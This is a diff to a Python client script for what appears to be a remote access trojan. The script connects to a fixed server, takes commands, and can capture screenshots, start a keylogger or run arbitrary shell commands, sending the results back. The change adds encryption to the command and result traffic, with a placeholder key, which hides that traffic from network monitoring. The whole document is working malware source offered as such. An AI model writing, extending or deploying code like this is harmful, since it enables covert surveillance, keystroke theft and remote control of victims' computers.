@@ -1,5 +1,6 @@
 import socket
 from features import execute_command, capture_screenshot, keylogger_start
+from utils import encrypt_data, decrypt_data
 
 SERVER_HOST = "192.168.0.10"  # Replace with your server IP
 SERVER_PORT = 9001
@@ -11,7 +12,8 @@ def start_client():
 
     while True:
         try:
-            command = client.recv(1024).decode()
+            encrypted_command = client.recv(1024)
+            command = decrypt_data(encrypted_command, "your-encryption-key")
             if command == "screenshot":
                 result = capture_screenshot()
             elif command == "keylogger":
@@ -24,9 +26,11 @@ def start_client():
             else:
                 result = execute_command(command)
             
-            client.send(result.encode())
+            encrypted_result = encrypt_data(result, "your-encryption-key")
+            client.send(encrypted_result)
         except Exception as e:
-            client.send(f"Error: {str(e)}".encode())
+            encrypted_error = encrypt_data(f"Error: {str(e)}", "your-encryption-key")
+            client.send(encrypted_error)
             break
 
     client.close()
